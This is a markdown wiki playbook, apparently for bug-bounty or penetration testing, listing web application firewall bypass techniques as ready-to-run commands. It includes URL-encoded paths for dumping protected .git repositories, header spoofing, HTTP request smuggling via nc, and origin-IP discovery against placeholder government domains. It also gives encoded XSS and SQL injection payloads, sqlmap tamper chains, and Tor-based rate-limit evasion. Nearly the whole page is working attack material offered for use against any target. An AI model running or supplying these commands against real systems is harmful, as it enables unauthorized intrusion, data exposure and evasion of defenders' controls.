---
type: wiki
category: playbook
status: active
last-updated: 2026-04-29
---

# WAF Bypass Command Quick Reference (Field Use)

> A quick-lookup command manual for "this WAF blocked me, what technique gets around it?"

## Quick WAF identification (identify first, then pick a bypass strategy)

```bash
# wafw00f auto-identification
wafw00f https://target.com

# Manually identify key headers
curl -sI https://target.com | grep -iE "server:|x-powered-by:|cf-ray:|x-sucuri|x-akamai"
```

| Header signature | WAF vendor | Common bypass |
|---------|---------|------------|
| `cf-ray:` | Cloudflare | origin IP bypass, `CF-Connecting-IP` spoofing |
| `x-sucuri-id:` | Sucuri | URL encoding, header injection |
| `server: AkamaiGHost` | Akamai | Accept-Language fuzz, path encoding |
| `server: Apache/2.x` + `.htaccess` | Custom Apache htaccess protection | URL encoding bypass (see below) |
| `x-mod-security:` / distinctive 403 format | ModSecurity | `%2f`, `..%2f`, `%0a` insertion |
| No special headers + a regular 403 pattern | Custom nginx location rules | `%2e`, `//`, `;` suffix |

### Apache htaccess `.git` protection → URL Encoding Bypass (field-tested)

**Principle**: Apache `.htaccess` `RewriteRule` or `FilesMatch`/`RedirectMatch` typically matches the literal string `.git`, and Apache **does not URL-decode the path** before evaluating the RewriteRule — so a URL-encoded version can bypass it completely.

```bash
# Confirm .git is blocked by htaccess
curl -I "https://target/.git/HEAD"   # → 403 Forbidden

# URL encoding bypass: . = %2e, g = %67, i = %69, t = %74
curl -s "https://target/%2e%67%69%74/HEAD"   # → 200 (bypass!)

# Other variants (pick based on WAF strictness)
curl -s "https://target/%2E%67%69%74/HEAD"   # uppercase %2E
curl -s "https://target/%2e%67%69%74/config" 
curl -s "https://target/%2e%67%69%74/packed-refs"
curl -s "https://target/%2e%67%69%74/logs/HEAD"

# git-dumper also supports URL-encoded paths
python3 -m git_dumper "https://target/%2e%67%69%74/" ./output/
```

**Real-world case (2026-04-29)**:
- Target: `target.example.com` (Apache/2.4.52 Ubuntu + Fat-Free Framework)
- `/.git/HEAD` → 403; `/%2e%67%69%74/HEAD` → **200**
- Extracted: an internal GitLab instance + internal hostnames + a root-level deployment
- Reported via the HITCON ZeroDay program (CVSS 5.3 Medium)


> Pair with `tools/hunters/hunt-waf-bypass.sh` for automation.
> Full theory in [01-waf-bypass-playbook.md](01-waf-bypass-playbook.md).

## Automation (try all bypasses in one shot)

```bash
tools/hunters/hunt-waf-bypass.sh https://target.com

# Test specific paths only
PATHS='/admin,/api/users,/.env' tools/hunters/hunt-waf-bypass.sh https://target.com

# When the origin IP is already known
ORIGIN_IP=1.2.3.4 tools/hunters/hunt-waf-bypass.sh https://target.com
```

Output flags which bypass techniques succeeded (`🟢 [BYPASS:xxx]`).

## Manual bypass command list

### 1. Path level

```bash
# Case variation (many WAFs are case-sensitive)
curl "https://target/APi/users"
curl "https://target/aDmIn"

# Trailing slash / double slash
curl "https://target/admin/"
curl "https://target//admin"
curl "https://target/admin/."
curl "https://target/./admin"

# Semicolon / percent-null / percent-tab
curl "https://target/admin;"
curl "https://target/admin%00"
curl "https://target/admin%00.html"
curl "https://target/admin%09"
curl "https://target/admin%20"
curl "https://target/admin%2e"

# Double URL encoding
curl "https://target/%2561dmin"     # %25 = %, %61 = a → %61 = a
curl "https://target/%252e%252e/"

# Fragment suffix
curl "https://target/admin#/"
curl "https://target/admin?x=1#/"

# Unicode normalization
curl "https://target/%C0%AE%C0%AE/"  # overlong UTF-8 for ..
```

### 2. Header level

```bash
# X-Original-URL / X-Rewrite-URL (Apache mod_rewrite / Spring)
curl -H "X-Original-URL: /admin" https://target/
curl -H "X-Rewrite-URL: /admin" https://target/

# X-Forwarded-For spoof
curl -H "X-Forwarded-For: 127.0.0.1" https://target/admin
curl -H "X-Forwarded-For: localhost" https://target/admin
curl -H "X-Forwarded-For: 192.168.0.1" https://target/admin
curl -H "X-Real-IP: 127.0.0.1" https://target/admin
curl -H "X-Remote-Addr: 127.0.0.1" https://target/admin
curl -H "X-Client-IP: 127.0.0.1" https://target/admin
curl -H "X-Originating-IP: 127.0.0.1" https://target/admin

# CDN-specific headers
curl -H "CF-Connecting-IP: 127.0.0.1" https://target/admin  # Cloudflare
curl -H "True-Client-IP: 127.0.0.1" https://target/admin    # Akamai
curl -H "X-Azure-ClientIP: 127.0.0.1" https://target/admin  # Azure

# Host header bypass
curl -H "Host: localhost" https://target/admin
curl -H "Host: admin.target.com" https://target/
curl -H "X-Original-Host: admin.target.com" https://target/
curl -H "X-Host: admin.target.com" https://target/
curl -H "X-Forwarded-Host: admin.target.com" https://target/

# Content-Type switching
curl -H "Content-Type: application/xml" -X POST -d '<x/>' https://target/api  # originally JSON
curl -H "Content-Type: text/plain" -X POST -d 'data' https://target/api
```

### 3. HTTP method switching

```bash
# Most WAFs only filter GET/POST
curl -X OPTIONS https://target/admin
curl -X HEAD https://target/admin
curl -X PATCH https://target/admin
curl -X PURGE https://target/admin
curl -X TRACE https://target/         # if enabled → reflected
curl -X CONNECT https://target/
curl -X DEBUG https://target/         # ASP.NET-specific
```

### 4. HTTP version switching

```bash
curl --http1.0 https://target/admin
curl --http1.1 https://target/admin
curl --http2 https://target/admin
curl --http3 https://target/admin   # requires QUIC support

# HTTP/2 smuggling (older WAFs only inspect HTTP/1.1)
nghttp https://target/admin
h2load -n 1 https://target/admin
```

### 5. Chunked encoding / smuggling

```bash
# Basic chunked
printf 'POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\n' | nc target 80

# CL.TE desync
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ' | nc target 80

# Automate with smuggler.py
python3 smuggler.py -u https://target -v
```

### 6. Connect directly to the origin IP (most effective)

```bash
# 1. First find the origin IP (without relying on target.com's DNS)
# crt.sh historical certificates
curl -s 'https://crt.sh/?q=%25.target.gov.tw&output=json' \
  | jq -r '.[].name_value' | sort -u

# Shodan certificate hash
shodan search 'ssl.cert.subject.cn:"target.gov.tw"'

# DNS history
curl -s "https://api.viewdns.info/iphistory/?domain=target.gov.tw&apikey=xxx&output=json"

# Censys
censys search "parsed.subject.common_name: target.gov.tw"

# 2. Once you have a candidate IP (e.g. 1.2.3.4), connect directly
curl -sk -H "Host: target.gov.tw" https://1.2.3.4/admin
curl -sk --resolve target.gov.tw:443:1.2.3.4 https://target.gov.tw/admin

# 3. Verify it's the same backend (matching body → confirms it's the origin)
diff <(curl -sk https://target.gov.tw/) <(curl -sk -H "Host: target.gov.tw" https://1.2.3.4/)
```

### 7. Non-standard ports

```bash
# rustscan one-liner
rustscan -a target.gov.tw --ulimit 5000 -- -sV

# Commonly overlooked ports
curl https://target.gov.tw:8080/admin
curl https://target.gov.tw:8443/admin
curl https://target.gov.tw:8888/admin
curl https://target.gov.tw:9090/admin
curl https://target.gov.tw:7001/console    # WebLogic

# If the port responds directly from the origin (not passing through the WAF)
nmap -sV -p- target.gov.tw --top-ports 1000
```

### 8. Subdomain bypass

```bash
# Generate candidates
subfinder -d target.gov.tw -silent | grep -iE "dev|uat|test|stage|beta|demo|sandbox|internal|old" > non_prod.txt

# Check whether each shares the same backend
while read -r sub; do
  echo "$sub"
  curl -sk "https://$sub/admin" -o /dev/null -w "%{http_code}\n"
done < non_prod.txt
```

### 9. WAF-specific bypasses

#### Cloudflare

```bash
# The __cf_bm cookie survives the JS challenge and can be reused for 30 minutes
curl -sIk https://target/ 2>&1 | grep -i "cf-ray"  # confirm it's CF

# Use cloudscraper
pip3 install cloudscraper
python3 -c "
import cloudscraper
r = cloudscraper.create_scraper().get('https://target/admin')
print(r.text)
"

# Use undetected-chromedriver or FlareSolverr
docker run -d -p 8191:8191 ghcr.io/flaresolverr/flaresolverr:latest
```

#### Akamai

```bash
# Akamai's regex is aggressive; try splitting the payload
# Original payload: <script>alert(1)</script>
# Split bypass:
curl "https://target/?a=<scr&b=ipt>alert(1)"  # works if the backend concatenates and reassembles

# Case variation is especially effective
curl "https://target/?q=%3cScRiPt%3e"

# Use a subdomain outside Akamai's CDN (e.g. a customer's self-hosted static CDN)
```

#### Imperva Incapsula

```bash
# Incapsula only protects DNS; the backend IP is very often public
# Finding the origin IP is the most effective bypass
```

#### AWS WAF

```bash
# Look for X-Amz-Cf-Id → indicates CloudFront
curl -sI https://target/ | grep -i x-amz

# AWS WAF rate-based rules only count per IP
# → switching IP / using Tor / changing X-Forwarded-For has no effect
# → but managed rules may still be sensitive to the payload string
```

#### SafeLine WAF

```bash
# Identification: response header contains waf.chaitin or x-waf: SafeLine-CE
# Bypass approaches:
# 1. SafeLine's HTTP/2 handling is newer — try --http2
# 2. Default rules are fairly loose; only custom rules get strict
# 3. Many customers only protect the frontend, and the backend IP can often be reached directly
```

### 10. Bypassing WAF with sqlmap / nuclei

```bash
# sqlmap tamper scripts
sqlmap -u 'https://target/page.php?id=1' \
  --tamper=between,randomcase,space2comment,charencode \
  --random-agent --delay 3 --timeout 30 -v 1

# Common tamper combinations
# MySQL: between,randomcase,space2mysqlblank,charunicodeencode
# MSSQL: between,randomcase,space2mssqlblank,equaltolike
# Oracle: between,randomcase,space2comment
# WAF heavy: versionedmorekeywords,versionedkeywords,space2mysqlhash

# Low-noise nuclei
nuclei -u https://target \
  -rate-limit 5 \
  -c 5 \
  -timeout 15 \
  -retries 1 \
  -H "X-Forwarded-For: 127.0.0.1" \
  -severity high,critical
```

### 11. Bypass via TLS fingerprint

```bash
# Some WAFs use the TLS JA3 fingerprint to identify Python/curl/Go clients
# Use curl-impersonate (mimics Chrome/Firefox's JA3)
docker run -v $PWD:/out lwthiker/curl-impersonate \
  curl_chrome116 https://target/admin -o /out/resp.html

# Or use cycletls / utls
```

### 12. Payload encoding

```bash
# XSS
Original: <script>alert(1)</script>

# HTML entity
"&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;"

# JavaScript unicode
"\u003cscript\u003ealert(1)\u003c/script\u003e"

# Char escape
"\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"

# Template literal (ES6)
"${alert(1)}"

# SVG / embed / no script tag
"<svg onload=alert(1)>"
"<img src=x onerror=alert(1)>"
"<iframe src=javascript:alert(1)>"

# SQLi
' OR '1'='1              → commonly blocked
'/**/OR/**/'1'='1       → use comments for whitespace
' OR '1'=`1`             → backtick sometimes bypasses
' %09OR%09 '1'='1        → tab
```

### 13. Manual testing with Burp / Caido

```bash
# Burp Intruder → payload position
# → payload set: simple list / recursive grep
# → Grep match: "Error" / "Forbidden"

# Caido's Automate tab is similar
```

### 14. Bypassing rate limits

```bash
# Per-IP limit → rotate IPs
curl --proxy socks5://127.0.0.1:9050 https://target  # Tor
curl -H "X-Forwarded-For: 1.2.3.$((RANDOM%255))"    # randomize

# Add a delay
for i in {1..100}; do
  curl https://target/api?id=$i
  sleep 2  # avoid rate-based rules
done
```

## Checklist (run for every target)

- [ ] Identify the WAF vendor with wafw00f
- [ ] `hunt-waf-bypass.sh` to auto-test 15+ techniques
- [ ] crt.sh / Shodan to find the origin IP
- [ ] subfinder to find non-prod subdomains
- [ ] rustscan to find non-standard ports
- [ ] If an origin is found → re-run all hunters (`--resolve target:443:IP`)
- [ ] If bypass fails → drop to low-rate mode (`-rate-limit 5 -c 5`)

## Related documents

- [01-waf-bypass-playbook.md](01-waf-bypass-playbook.md) — theory and strategy
- [02-gov-site-quick-wins.md](02-gov-site-quick-wins.md)
- [22-tool-subfinder-httpx.md](22-tool-subfinder-httpx.md)
